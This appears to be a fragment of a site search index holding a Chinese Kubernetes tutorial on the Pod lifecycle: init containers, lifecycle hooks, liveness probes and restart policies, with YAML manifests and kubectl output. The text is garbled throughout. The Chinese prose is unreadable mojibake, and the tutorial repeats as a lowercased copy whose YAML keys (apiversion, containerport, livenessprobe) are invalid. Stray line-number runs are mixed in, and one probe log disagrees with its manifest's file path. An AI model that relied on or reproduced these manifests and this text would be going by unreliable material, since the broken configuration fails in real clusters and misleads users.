     path: /\n      initialDelaySeconds: 30 # å®¹å¨å¯å¨å30så¼å§æ¢æµ\n      timeoutSeconds: 5 # æ¢æµè¶æ¶æ¶é´ä¸º5s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# éå¯ç­ç¥\n\nä¸æ¦å®¹å¨æ¢æµåºç°äºé®é¢ï¼kubernetes å°±ä¼å¯¹å®¹å¨æå¨ç Pod è¿è¡éå¯ï¼å¶å®è¿æ¯ç± pod çéå¯ç­ç¥å³å®çï¼pod çéå¯ç­ç¥æ 3 ç§ï¼åå«å¦ä¸ï¼\n\n * Always ï¼å®¹å¨å¤±ææ¶ï¼èªå¨éå¯è¯¥å®¹å¨ï¼è¿ä¹æ¯é»è®¤å¼ã\n * OnFailure ï¼ å®¹å¨ç»æ­¢è¿è¡ä¸éåºç ä¸ä¸º 0 æ¶éå¯\n * Never ï¼ ä¸è®ºç¶æä¸ºä½ï¼é½ä¸éå¯è¯¥å®¹å¨\n\néå¯ç­ç¥éç¨äº pod å¯¹è±¡ä¸­çææå®¹å¨ï¼é¦æ¬¡éè¦éå¯çå®¹å¨ï¼å°å¨å¶éè¦æ¶ç«å³è¿è¡éå¯ï¼éååæ¬¡éè¦éå¯çæä½å°ç± kubelet å»¶è¿ä¸æ®µæ¶é´åè¿è¡ï¼ä¸åå¤çéå¯æä½çå»¶è¿æ¶é¿ä»¥æ­¤ä¸º 10sã20sã40sã80sã160s å 300sï¼300s æ¯æå¤§å»¶è¿æ¶é¿ã\n\nåå»º pod-restartpolicy.yamlï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-restartpolicy\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      httpGet:\n        scheme: HTTP\n        port: 80\n        path: /hello\n  restartPolicy: Never # è®¾ç½®éå¯ç­ç¥ä¸ºNever\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nè¿è¡ Pod æµè¯\n\n# åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f pod-restartpolicy.yaml\npod/pod-restartpolicy created\n\n# æ¥çPodè¯¦æï¼åç°nginxå®¹å¨å¤±è´¥\n[root@k8s-master01 ~]# kubectl  describe pods pod-restartpolicy  -n dev\n......\n  Warning  Unhealthy  15s (x3 over 35s)  kubelet, node1     Liveness probe failed: HTTP probe failed with statuscode: 404\n  Normal   Killing    15s                kubelet, node1     Container nginx failed liveness probe\n  \n# å¤ç­ä¸ä¼ï¼åè§å¯podçéå¯æ¬¡æ°ï¼åç°ä¸ç´æ¯0ï¼å¹¶æªéå¯   \n[root@k8s-master01 ~]# kubectl  get pods pod-restartpolicy -n dev\nNAME                   READY   STATUS    RESTARTS   AGE\npod-restartpolicy      0/1     Running   0          5min42s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n',normalizedContent:'# æ¦è¿°\n\næä»¬ä¸è¬å° pod å¯¹è±¡ä»åå»ºè³ç»çè¿æ®µæ¶é´èå´ç§°ä¸º pod ççå½å¨æï¼å®ä¸»è¦åå«ä¸é¢çè¿ç¨ï¼\n\n * pod åå»ºè¿ç¨\n * è¿è¡åå§åå®¹å¨ï¼init containerï¼è¿ç¨\n * è¿è¡ä¸»å®¹å¨ï¼main containerï¼è¿ç¨\n   * å®¹å¨å¯å¨åé©å­ï¼post startï¼ãå®¹å¨ç»æ­¢åé©å­ï¼pre stopï¼\n     - å®¹å¨çå­æ´»æ§æ¢æµï¼liveness probeï¼ãå°±ç»ªæ§æ¢æµï¼readiness probeï¼\n * pod ç»æ­¢è¿ç¨\n\n\n\nå¨æ´ä¸ªçå½å¨æä¸­ï¼pod ä¼åºç° 5 ä¸­ç¶æï¼åå«å¦ä¸ï¼\n\n * æèµ·ï¼pendingï¼ï¼apiserver å·²ç»åå»ºäº pod èµæºå¯¹è±¡ï¼ä½å®å°æªè¢«è°åº¦å®ææèä»å¤äºä¸è½½éåçè¿ç¨ä¸­\n * è¿è¡ä¸­ï¼runningï¼ï¼pod å·²ç»è¢«è°åº¦è³æèç¹ï¼å¹¶ä¸ææå®¹å¨é½å·²ç»è¢« kubelet åå»ºå®æ\n * æåï¼successdedï¼ï¼pod ä¸­çææå®¹å¨é½å·²ç»æåç»æ­¢å¹¶ä¸ä¸ä¼è¢«éå¯\n * å¤±è´¥ï¼failedï¼ï¼ææå®¹å¨é½å·²ç»ç»æ­¢ï¼ä½è³å°æä¸ä¸ªå®¹å¨ç»æ­¢å¤±è´¥ï¼å³å®¹å¨è¿åäºé 0 å¼å¾éåºç¶æ\n * æªç¥ï¼unknownï¼ï¼apiserver æ æ³æ­£å¸¸è·åå° pod å¯¹è±¡çç¶æä¿¡æ¯ï¼éå¸¸ç±ç½ç»éä¿¡å¤±è´¥æå¯¼è´\n\n\n# åå»ºåç»æ­¢\n\npod çåå»ºè¿ç¨\n\n 1. ç¨æ·éè¿ kubectl æå¶ä» api å®¢æ·ç«¯æäº¤éè¦åå»ºç pod ä¿¡æ¯ç» apiserver\n 2. apiserver å¼å§çæ pod å¯¹è±¡çä¿¡æ¯ï¼å¹¶å°ä¿¡æ¯å­å¥ etcdï¼ç¶åè¿åç¡®è®¤ä¿¡æ¯è³å®¢æ·ç«¯\n 3. apiserver å¼å§åæ  etcd ä¸­ç pod å¯¹è±¡çååï¼å¶å®ç»ä»¶ä½¿ç¨ watch æºå¶æ¥è·è¸ªæ£æ¥ apiserver ä¸çåå¨\n 4. scheduler åç°ææ°ç pod å¯¹è±¡è¦åå»ºï¼å¼å§ä¸º pod åéä¸»æºå¹¶å°ç»æä¿¡æ¯æ´æ°è³ apiserver\n 5. node èç¹ä¸ç kubelet åç°æ pod è°åº¦è¿æ¥ï¼å°è¯è°ç¨ docker å¯å¨å®¹å¨ï¼å¹¶å°ç»æåéè³ apiserver\n 6. apiserver å°æ¥æ¶å°ç pod ç¶æä¿¡æ¯å­å¥ etcd ä¸­\n\n\n\npod çç»æ­¢è¿ç¨\n\n 1. ç¨æ·å apiserver åéå é¤ pod å¯¹è±¡çå½ä»¤\n 2. apiservcer ä¸­ç pod å¯¹è±¡ä¿¡æ¯ä¼éçæ¶é´çæ¨ç§»èæ´æ°ï¼å¨å®½éæåï¼é»è®¤ 30sï¼ï¼pod è¢«è§ä¸º dead\n 3. å° pod æ è®°ä¸º terminating ç¶æ\n 4. kubelet å¨çæ§å° pod å¯¹è±¡è½¬ä¸º terminating ç¶æçåæ¶å¯å¨ pod å³é­è¿ç¨\n 5. ç«¯ç¹æ§å¶å¨çæ§å° pod å¯¹è±¡çå³é­è¡ä¸ºæ¶å°å¶ä»ææå¹éå°æ­¤ç«¯ç¹ç service èµæºçç«¯ç¹åè¡¨ä¸­ç§»é¤\n 6. å¦æå½å pod å¯¹è±¡å®ä¹äº prestop é©å­å¤çå¨ï¼åå¨å¶æ è®°ä¸º terminating åå³ä¼ä»¥åæ­¥çæ¹å¼å¯å¨æ§è¡\n 7. pod å¯¹è±¡ä¸­çå®¹å¨è¿ç¨æ¶å°åæ­¢ä¿¡å·\n 8. å®½éæç»æåï¼è¥ pod ä¸­è¿å­å¨ä»å¨è¿è¡çè¿ç¨ï¼é£ä¹ pod å¯¹è±¡ä¼æ¶å°ç«å³ç»æ­¢çä¿¡å·\n 9. kubelet è¯·æ± apiserver å°æ­¤ pod èµæºçå®½éæè®¾ç½®ä¸º 0 ä»èå®æå é¤æä½ï¼æ­¤æ¶ pod å¯¹äºç¨æ·å·²ä¸å¯è§\n\n\n# åå§ååå®¹å¨\n\nåå§åå®¹å¨æ¯å¨ pod çä¸»å®¹å¨å¯å¨ä¹åè¦è¿è¡çå®¹å¨ï¼ä¸»è¦æ¯åä¸äºä¸»å®¹å¨çåç½®å·¥ä½ï¼å®å·æä¸¤å¤§ç¹å¾ï¼\n\n 1. åå§åå®¹å¨å¿é¡»è¿è¡å®æç´è³ç»æï¼è¥æåå§åå®¹å¨è¿è¡å¤±è´¥ï¼é£ä¹ kubernetes éè¦éå¯å®ç´å°æåå®æ\n 2. åå§åå®¹å¨å¿é¡»æç§å®ä¹çé¡ºåºæ§è¡ï¼å½ä¸ä»å½åä¸ä¸ªæåä¹åï¼åé¢çä¸ä¸ªæè½è¿è¡\n\nåå§åå®¹å¨æå¾å¤çåºç¨åºæ¯ï¼ä¸é¢ååºçæ¯æå¸¸è§çå ä¸ªï¼\n\n * æä¾ä¸»å®¹å¨éåä¸­ä¸å·å¤çå·¥å·ç¨åºæèªå®ä¹ä»£ç \n * åå§åå®¹å¨è¦åäºåºç¨å®¹å¨ä¸²è¡å¯å¨å¹¶è¿è¡å®æï¼å æ­¤å¯ç¨äºå»¶ååºç¨å®¹å¨çå¯å¨ç´è³å¶ä¾èµçæ¡ä»¶å¾å°æ»¡è¶³\n\nåè®¾è¦ä»¥ä¸»å®¹å¨æ¥è¿è¡ nginxï¼ä½æ¯è¦æ±å¨è¿è¡ nginx ä¹ååè¦è½å¤è¿æ¥ä¸ç¸åºçæå¡å¨æ¯å¯ä»¥ ping éçã\nåå»º pod-initcontainer.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-initcontainer\n  namespace: dev\nspec:\n  containers:\n  - name: main-container\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerport: 80\n  # åå§åå®¹å¨\n  initcontainers:\n  # æ¨¡æmysqlè¿æ¥\n  - name: test-mysql\n    image: busybox:1.30\n    command: [\'sh\', \'-c\', \'until ping 192.168.81.102 -c 1 ; do echo waiting for mysql...; sleep 2; done;\']ã\n  # æ¨¡æredisè¿æ¥\n  - name: test-redis\n    image: busybox:1.30\n    command: [\'sh\', \'-c\', \'until ping 192.168.81.103 -c 1 ; do echo waiting for reids...; sleep 2; done;\']\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-initcontainer.yaml\npod/pod-initcontainer created\n\n# æ¥çpodç¶æ\n# åç°podå¡å¨å¯å¨ç¬¬ä¸ä¸ªåå§åå®¹å¨è¿ç¨ä¸­ï¼åé¢çå®¹å¨ä¸ä¼è¿è¡\nroot@k8s-master01 ~]# kubectl describe pod  pod-initcontainer -n dev\n........\nevents:\n  type    reason     age   from               message\n  ----    ------     ----  ----               -------\n  normal  scheduled  49s   default-scheduler  successfully assigned dev/pod-initcontainer to node1\n  normal  pulled     48s   kubelet, node1     container image "busybox:1.30" already present on machine\n  normal  created    48s   kubelet, node1     created container test-mysql\n  normal  started    48s   kubelet, node1     started container test-mysql\n\n# å¨ææ¥çpod\n[root@k8s-master01 ~]# kubectl get pods pod-initcontainer -n dev -w\nname                             ready   status     restarts   age\npod-initcontainer                0/1     init:0/2   0          15s\npod-initcontainer                0/1     init:1/2   0          52s\npod-initcontainer                0/1     init:1/2   0          53s\npod-initcontainer                0/1     podinitializing   0          89s\npod-initcontainer                1/1     running           0          90s\n\n# æ¥ä¸æ¥æ°å¼ä¸ä¸ªshellï¼ä¸ºå½åæå¡å¨æ°å¢ä¸¤ä¸ªipï¼è§å¯podçååï¼ä¸ºç½å¡æ·»å å°å\n[root@k8s-master01 ~]# ifconfig ens33:1 192.168.81.102 netmask 255.255.255.0 up\n[root@k8s-master01 ~]# ifconfig ens33:2 192.168.81.103 netmask 255.255.255.0 up\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# é©å­å½æ°\n\né©å­å½æ°è½å¤æç¥èªèº«çå½å¨æä¸­çäºä»¶ï¼å¹¶å¨ç¸åºçæ¶å»å°æ¥æ¶è¿è¡ç¨æ·æå®çç¨åºä»£ç ã\n\nkubernetes å¨ä¸»å®¹å¨çå¯å¨ä¹åååæ­¢ä¹åæä¾äºä¸¤ä¸ªé©å­å½æ°ï¼\n\n * post startï¼å®¹å¨åå»ºä¹åæ§è¡ï¼å¦æå¤±è´¥äºä¼éå¯å®¹å¨\n * pre stop ï¼å®¹å¨ç»æ­¢ä¹åæ§è¡ï¼æ§è¡å®æä¹åå®¹å¨å°æåç»æ­¢ï¼å¨å¶å®æä¹åä¼é»å¡å é¤å®¹å¨çæä½\n\né©å­å¤çå¨æ¯æä½¿ç¨ä¸é¢ä¸ç§æ¹å¼å®ä¹å¨ä½ï¼\n\n * exec å½ä»¤ï¼å¨å®¹å¨åæ§è¡ä¸æ¬¡å½ä»¤\n\nâ¦â¦\n  lifecycle:\n    poststart: \n      exec:\n        command:\n        - cat\n        - /tmp/healthy\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * tcpsocketï¼å¨å½åå®¹å¨å°è¯è®¿é®æå®ç socket\n\nâ¦â¦      \n  lifecycle:\n    poststart:\n      tcpsocket:\n        port: 8080\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n\n * httpgetï¼å¨å½åå®¹å¨ä¸­åæ url åèµ· http è¯·æ±\n\nâ¦â¦\n  lifecycle:\n    poststart:\n      httpget:\n        path: / #uriå°å\n        port: 80 #ç«¯å£å·\n        host: 192.168.5.3 #ä¸»æºå°å\n        scheme: http #æ¯æçåè®®ï¼httpæèhttps\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næ¥ä¸æ¥ï¼ä»¥ exec æ¹å¼ä¸ºä¾ï¼æ¼ç¤ºä¸é©å­å½æ°çä½¿ç¨ï¼åå»º pod-hook-exec.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-hook-exec\n  namespace: dev\nspec:\n  containers:\n  - name: main-container\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerport: 80\n    # çå½å¨æ\n    lifecycle:\n      poststart: \n        exec: # å¨å®¹å¨å¯å¨çæ¶åæ§è¡ä¸ä¸ªå½ä»¤ï¼ä¿®æ¹ænginxçé»è®¤é¦é¡µåå®¹\n          command: ["/bin/sh", "-c", "echo poststart... > /usr/share/nginx/html/index.html"]\n      prestop:\n        exec: # å¨å®¹å¨åæ­¢ä¹ååæ­¢nginxæå¡\n          command: ["/usr/sbin/nginx","-s","quit"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-hook-exec.yaml\npod/pod-hook-exec created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods  pod-hook-exec -n dev -o wide\nname           ready   status     restarts   age    ip            node    \npod-hook-exec  1/1     running    0          29s    10.244.2.48   node2   \n\n# è®¿é®pod\n[root@k8s-master01 ~]# curl 10.244.2.48\npoststart...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# å®¹å¨æ¢æµ\n\nå®¹å¨æ¢æµç¨äºæ£æµå®¹å¨ä¸­çåºç¨å®ä¾æ¯å¦æ­£å¸¸å·¥ä½ï¼æ¯ä¿éä¸å¡å¯ç¨æ§çä¸ç§ä¼ ç»æºå¶ãå¦æç»è¿æ¢æµï¼å®ä¾çç¶æä¸ç¬¦åé¢æï¼é£ä¹ kubernetes å°±ä¼æè¯¥é®é¢å®ä¾ "æé¤"ï¼ä¸æ¿æä¸å¡æµéãkubernetes æä¾äºä¸¤ç§æ¢éæ¥å®ç°å®¹å¨æ¢æµï¼åå«æ¯ï¼\n\n * liveness probesï¼å­æ´»æ§æ¢éï¼ç¨äºæ£æµåºç¨å®ä¾å½åæ¯å¦å¤äºæ­£å¸¸è¿è¡ç¶æï¼å¦æä¸æ¯ï¼k8s ä¼éå¯å®¹å¨\n * readiness probesï¼å°±ç»ªæ§æ¢éï¼ç¨äºæ£æµåºç¨å®ä¾å½åæ¯å¦å¯ä»¥æ¥æ¶è¯·æ±ï¼å¦æä¸è½ï¼k8s ä¸ä¼è½¬åæµé\n\n> livenessprobe å³å®æ¯å¦éå¯å®¹å¨ï¼readinessprobe å³å®æ¯å¦å°è¯·æ±è½¬åç»å®¹å¨ã\n\nä¸é¢ä¸¤ç§æ¢éç®ååæ¯æä¸ç§æ¢æµæ¹å¼ï¼\n\n * exec å½ä»¤ï¼å¨å®¹å¨åæ§è¡ä¸æ¬¡å½ä»¤ï¼å¦æå½ä»¤æ§è¡çéåºç ä¸º 0ï¼åè®¤ä¸ºç¨åºæ­£å¸¸ï¼å¦åä¸æ­£å¸¸\n\nâ¦â¦\n  livenessprobe:\n    exec:\n      command:\n      - cat\n      - /tmp/healthy\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * tcpsocketï¼å°ä¼å°è¯è®¿é®ä¸ä¸ªç¨æ·å®¹å¨çç«¯å£ï¼å¦æè½å¤å»ºç«è¿æ¡è¿æ¥ï¼åè®¤ä¸ºç¨åºæ­£å¸¸ï¼å¦åä¸æ­£å¸¸\n\nâ¦â¦      \n  livenessprobe:\n    tcpsocket:\n      port: 8080\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n\n * httpgetï¼è°ç¨å®¹å¨å web åºç¨ç urlï¼å¦æè¿åçç¶æç å¨ 200 å 399 ä¹é´ï¼åè®¤ä¸ºç¨åºæ­£å¸¸ï¼å¦åä¸æ­£å¸¸\n\nâ¦â¦\n  livenessprobe:\n    httpget:\n      path: / #uriå°å\n      port: 80 #ç«¯å£å·\n      host: 127.0.0.1 #ä¸»æºå°å\n      scheme: http #æ¯æçåè®®ï¼httpæèhttps\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nä¸é¢ä»¥ liveness probes ä¸ºä¾ï¼åå ä¸ªæ¼ç¤ºï¼\næ¹å¼ä¸ï¼exec\nåå»º pod-liveness-exec.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-liveness-exec\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      exec:\n        command: ["/bin/cat","/tmp/hello.txt"] # æ§è¡ä¸ä¸ªæ¥çæä»¶çå½ä»¤\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nåå»º podï¼è§å¯ææ\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-exec.yaml\npod/pod-liveness-exec created\n\n# æ¥çpodè¯¦æ\n[root@k8s-master01 ~]# kubectl describe pods pod-liveness-exec -n dev\n......\n  normal   created    20s (x2 over 50s)  kubelet, node1     created container nginx\n  normal   started    20s (x2 over 50s)  kubelet, node1     started container nginx\n  normal   killing    20s                kubelet, node1     container nginx failed liveness probe, will be restarted\n  warning  unhealthy  0s (x5 over 40s)   kubelet, node1     liveness probe failed: cat: can\'t open \'/tmp/hello11.txt\': no such file or directory\n  \n# è§å¯ä¸é¢çä¿¡æ¯å°±ä¼åç°nginxå®¹å¨å¯å¨ä¹åå°±è¿è¡äºå¥åº·æ£æ¥\n# æ£æ¥å¤±è´¥ä¹åï¼å®¹å¨è¢«killæï¼ç¶åå°è¯è¿è¡éå¯ï¼è¿æ¯éå¯ç­ç¥çä½ç¨ï¼åé¢è®²è§£ï¼\n# ç¨ç­ä¸ä¼ä¹åï¼åè§å¯podä¿¡æ¯ï¼å°±å¯ä»¥çå°restartsä¸åæ¯0ï¼èæ¯ä¸ç´å¢é¿\n[root@k8s-master01 ~]# kubectl get pods pod-liveness-exec -n dev\nname                ready   status             restarts   age\npod-liveness-exec   0/1     crashloopbackoff   2          3m19s\n\n# å½ç¶æ¥ä¸æ¥ï¼å¯ä»¥ä¿®æ¹æä¸ä¸ªå­å¨çæä»¶ï¼æ¯å¦/tmp/hello.txtï¼åè¯ï¼ç»æå°±æ­£å¸¸äº......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\næ¹å¼äºï¼tcpsocket\nåå»º pod-liveness-tcpsocket.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-liveness-tcpsocket\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      tcpsocket:\n        port: 8080 # å°è¯è®¿é®8080ç«¯å£\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nåå»º podï¼è§å¯ææ\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-tcpsocket.yaml\npod/pod-liveness-tcpsocket created\n\n# æ¥çpodè¯¦æ\n[root@k8s-master01 ~]# kubectl describe pods pod-liveness-tcpsocket -n dev\n......\n  normal   scheduled  31s                            default-scheduler  successfully assigned dev/pod-liveness-tcpsocket to node2\n  normal   pulled     <invalid>                      kubelet, node2     container image "nginx:1.17.1" already present on machine\n  normal   created    <invalid>                      kubelet, node2     created container nginx\n  normal   started    <invalid>                      kubelet, node2     started container nginx\n  warning  unhealthy  <invalid> (x2 over <invalid>)  kubelet, node2     liveness probe failed: dial tcp 10.244.2.44:8080: connect: connection refused\n  \n# è§å¯ä¸é¢çä¿¡æ¯ï¼åç°å°è¯è®¿é®8080ç«¯å£,ä½æ¯å¤±è´¥äº\n# ç¨ç­ä¸ä¼ä¹åï¼åè§å¯podä¿¡æ¯ï¼å°±å¯ä»¥çå°restartsä¸åæ¯0ï¼èæ¯ä¸ç´å¢é¿\n[root@k8s-master01 ~]# kubectl get pods pod-liveness-tcpsocket  -n dev\nname                     ready   status             restarts   age\npod-liveness-tcpsocket   0/1     crashloopbackoff   2          3m19s\n\n# å½ç¶æ¥ä¸æ¥ï¼å¯ä»¥ä¿®æ¹æä¸ä¸ªå¯ä»¥è®¿é®çç«¯å£ï¼æ¯å¦80ï¼åè¯ï¼ç»æå°±æ­£å¸¸äº......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\næ¹å¼ä¸ï¼httpget\nåå»º pod-liveness-httpget.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-liveness-httpget\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      httpget:  # å¶å®å°±æ¯è®¿é®http://127.0.0.1:80/hello  \n        scheme: http #æ¯æçåè®®ï¼httpæèhttps\n        port: 80 #ç«¯å£å·\n        path: /hello #uriå°å\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nåå»º podï¼è§å¯ææ\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-httpget.yaml\npod/pod-liveness-httpget created\n\n# æ¥çpodè¯¦æ\n[root@k8s-master01 ~]# kubectl describe pod pod-liveness-httpget -n dev\n.......\n  normal   pulled     6s (x3 over 64s)  kubelet, node1     container image "nginx:1.17.1" already present on machine\n  normal   created    6s (x3 over 64s)  kubelet, node1     created container nginx\n  normal   started    6s (x3 over 63s)  kubelet, node1     started container nginx\n  warning  unhealthy  6s (x6 over 56s)  kubelet, node1     liveness probe failed: http probe failed with statuscode: 404\n  normal   killing    6s (x2 over 36s)  kubelet, node1     container nginx failed liveness probe, will be restarted\n  \n# è§å¯ä¸é¢ä¿¡æ¯ï¼å°è¯è®¿é®è·¯å¾ï¼ä½æ¯æªæ¾å°,åºç°404éè¯¯\n# ç¨ç­ä¸ä¼ä¹åï¼åè§å¯podä¿¡æ¯ï¼å°±å¯ä»¥çå°restartsä¸åæ¯0ï¼èæ¯ä¸ç´å¢é¿\n[root@k8s-master01 ~]# kubectl get pod pod-liveness-httpget -n dev\nname                   ready   status    restarts   age\npod-liveness-httpget   1/1     running   5          3m17s\n\n# å½ç¶æ¥ä¸æ¥ï¼å¯ä»¥ä¿®æ¹æä¸ä¸ªå¯ä»¥è®¿é®çè·¯å¾pathï¼æ¯å¦/ï¼åè¯ï¼ç»æå°±æ­£å¸¸äº......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nè³æ­¤ï¼å·²ç»ä½¿ç¨ liveness probe æ¼ç¤ºäºä¸ç§æ¢æµæ¹å¼ï¼ä½æ¯æ¥ç livenessprobe çå­å±æ§ï¼ä¼åç°é¤äºè¿ä¸ç§æ¹å¼ï¼è¿æä¸äºå¶ä»çéç½®ï¼å¨è¿éä¸å¹¶è§£éä¸ï¼\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers.livenessprobe\nfields:\n   exec <object>  \n   tcpsocket    <object>\n   httpget      <object>\n   initialdelayseconds  <integer>  # å®¹å¨å¯å¨åç­å¾å¤å°ç§æ§è¡ç¬¬ä¸æ¬¡æ¢æµ\n   timeoutseconds       <integer>  # æ¢æµè¶æ¶æ¶é´ãé»è®¤1ç§ï¼æå°1ç§\n   periodseconds        <integer>  # æ§è¡æ¢æµçé¢çãé»è®¤æ¯10ç§ï¼æå°1ç§\n   failurethreshold     <integer>  # è¿ç»­æ¢æµå¤±è´¥å¤å°æ¬¡æè¢«è®¤å®ä¸ºå¤±è´¥ãé»è®¤æ¯3ãæå°å¼æ¯1\n   successthreshold     <integer>  # è¿ç»­æ¢æµæåå¤å°æ¬¡æè¢«è®¤å®ä¸ºæåãé»è®¤æ¯1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * initialdelayseconds å®¹å¨å¯å¨åç­å¾å¤å°ç§æ§è¡ç¬¬ä¸æ¬¡æ¢æµ\n * timeoutseconds æ¢æµè¶æ¶æ¶é´ãé»è®¤ 1 ç§ï¼æå° 1 ç§\n * periodseconds æ§è¡æ¢æµçé¢çãé»è®¤æ¯ 10 ç§ï¼æå° 1 ç§\n * failurethreshold è¿ç»­æ¢æµå¤±è´¥å¤å°æ¬¡æè¢«è®¤å®ä¸ºå¤±è´¥ãé»è®¤æ¯ 3ãæå°å¼æ¯ 1\n * successthreshold è¿ç»­æ¢æµæåå¤å°æ¬¡æè¢«è®¤å®ä¸ºæåãé»è®¤æ¯ 1\n\nä¸é¢ç¨å¾®éç½®ä¸¤ä¸ªï¼æ¼ç¤ºä¸ææå³å¯ï¼\n\n[root@k8s-master01 ~]# more pod-liveness-httpget.yaml\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-liveness-httpget\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      httpget:\n        scheme: http\n        port: 80 \n        path: /\n      initialdelayseconds: 30 # å®¹å¨å¯å¨å30så¼å§æ¢æµ\n      timeoutseconds: 5 # æ¢æµè¶æ¶æ¶é´ä¸º5s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# éå¯ç­ç¥\n\nä¸æ¦å®¹å¨æ¢æµåºç°äºé®é¢ï¼kubernetes å°±ä¼å¯¹å®¹å¨æå¨ç pod è¿è¡éå¯ï¼å¶å®è¿æ¯ç± pod çéå¯ç­ç¥å³å®çï¼pod çéå¯ç­ç¥æ 3 ç§ï¼åå«å¦ä¸ï¼\n\n * always ï¼å®¹å¨å¤±ææ¶ï¼èªå¨éå¯è¯¥å®¹å¨ï¼è¿ä¹æ¯é»è®¤å¼ã\n * onfailure ï¼ å®¹å¨ç»æ­¢è¿è¡ä¸éåºç ä¸ä¸º 0 æ¶éå¯\n * never ï¼ ä¸è®ºç¶æä¸ºä½ï¼é½ä¸éå¯è¯¥å®¹å¨\n\néå¯ç­ç¥éç¨äº pod å¯¹è±¡ä¸­çææå®¹å¨ï¼é¦æ¬¡éè¦éå¯çå®¹å¨ï¼å°å¨å¶éè¦æ¶ç«å³è¿è¡éå¯ï¼éååæ¬¡éè¦éå¯çæä½å°ç± kubelet å»¶è¿ä¸æ®µæ¶é´åè¿è¡ï¼ä¸åå¤çéå¯æä½çå»¶è¿æ¶é¿ä»¥æ­¤ä¸º 10sã20sã40sã80sã160s å 300sï¼300s æ¯æå¤§å»¶è¿æ¶é¿ã\n\nåå»º pod-restartpolicy.yamlï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-restartpolicy\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      httpget:\n        scheme: http\n        port: 80\n        path: /hello\n  restartpolicy: never # è®¾ç½®éå¯ç­ç¥ä¸ºnever\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nè¿è¡ pod æµè¯\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-restartpolicy.yaml\npod/pod-restartpolicy created\n\n# æ¥çpodè¯¦æï¼åç°nginxå®¹å¨å¤±è´¥\n[root@k8s-master01 ~]# kubectl  describe pods pod-restartpolicy  -n dev\n......\n  warning  unhealthy  15s (x3 over 35s)  kubelet, node1     liveness probe failed: http probe failed with statuscode: 404\n  normal   killing    15s                kubelet, node1     container nginx failed liveness probe\n  \n# 